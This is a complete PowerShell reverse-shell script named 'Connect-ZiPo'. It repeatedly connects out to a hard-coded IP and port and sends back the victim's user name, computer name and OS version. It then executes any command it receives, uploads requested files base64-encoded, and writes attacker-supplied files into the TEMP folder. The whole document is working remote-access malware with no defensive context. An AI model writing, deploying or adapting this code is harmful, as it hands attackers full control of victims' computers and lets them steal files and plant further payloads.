function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666

    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::n$b64"
        } else {
            return "[ERROR]::FILE NOT FOUND: $path"
        }
    }

    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            # ANSI-цвета и баннер
            $esc = [char]27
            $clear = "$esc[2J$esc[H"
            $banner = @"
${esc}[31m
  __/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\______/\\\\\\\\\\\\\\\___        
   _\/\\\///////////____\/\\\///////////_____/\\\///////////__         
    _\/\\\_______________\/\\\_______________\//\\\______        
     _\/\\\\\\\\\\\_______\/\\\\\\\\\\\________\////\\\______      
      _\/\\\///////________\/\\\///////____________\////\\\____       
       _\/\\\_______________\/\\\_____________________\////\\\__      
        _\/\\\_______________\/\\\______________/\\\______\//\\\_     
         _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
          _\///________________\///////////////____\///////////____${esc}[0m

${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
------------------------------------------------------------
"@

            $intro = $clear + $banner + "nPS " + (Get-Location) + "> "
            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()

                try {
                    if ($cmd.StartsWith("!get")) {
                        $path = $cmd.Substring(4).Trim()
                        $response = Upload-File $path
                    }
                    elseif ($cmd.StartsWith("!post")) {
                        $parts = $cmd.Split("::")
                        if ($parts.Length -eq 3) {
                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                        } else {
                            $response = "[ERROR] INVALID POST FORMAT"
                        }
                    }
                    else {
                        $sb = [ScriptBlock]::Create($cmd)
                        $output = & $sb 2>&1 | Out-String
                        $response = $output.TrimEnd()
                    }
                }
                catch {
                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                }

                $response += "nPS " + (Get-Location) + "> "
                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
